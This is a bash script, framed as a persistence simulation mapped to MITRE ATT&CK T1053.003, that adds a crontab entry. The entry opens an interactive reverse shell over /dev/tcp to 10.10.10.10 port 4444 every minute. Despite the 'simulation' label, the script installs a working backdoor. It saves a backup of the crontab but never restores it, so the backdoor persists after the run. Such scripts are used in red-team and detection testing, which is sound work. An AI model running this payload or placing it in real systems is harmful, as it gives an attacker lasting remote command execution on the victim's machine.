#!/bin/bash

# Persistence Simulation Script (Linux Crontab)
# This script simulates an attacker establishing persistence by adding a malicious entry to the user's crontab.
# MITRE ATT&CK T1053.003

echo "[*] Simulating persistence via crontab..."

# Backup current crontab
crontab -l > /tmp/cron_backup 2>/dev/null

# Malicious payload (simulated reverse shell or callback)
PAYLOAD="* * * * * /bin/bash -c 'exec 5<>/dev/tcp/10.10.10.10/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done' # Backdoor"

# Add payload to crontab
(crontab -l 2>/dev/null; echo "$PAYLOAD") | crontab -

if [ $? -eq 0 ]; then
    echo "[+] Malicious cron job added successfully."
    echo "[*] Current Crontab Entry:"
    crontab -l | tail -n 1
else
    echo "[-] Failed to modify crontab."
fi

echo "[*] Simulation complete. Monitor for file integrity changes in /var/spool/cron or crontab execution logs."
